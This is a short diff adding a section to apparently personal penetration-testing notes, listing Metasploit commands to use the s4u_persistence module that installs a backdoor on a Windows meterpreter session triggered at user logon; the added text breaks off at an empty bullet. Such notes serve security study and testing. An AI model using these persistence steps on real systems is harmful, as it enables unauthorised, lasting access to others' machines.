@@ -131,5 +131,18 @@ __Unshadow__
         
 > - exploit
 
+&nbsp;
+
+### USing Metasploit with exploits:
 
 
+__[s4u_persistence]                             |  install backdoor on meterpreter session using__ 
+
+- use exploit/windows/local/s4u_persistence     |  module 
+
+- show options                                  |  show options that come with the module 
+
+- set trigger logon                             |  sets up the module to start when the usre logson 
+
+
+- 
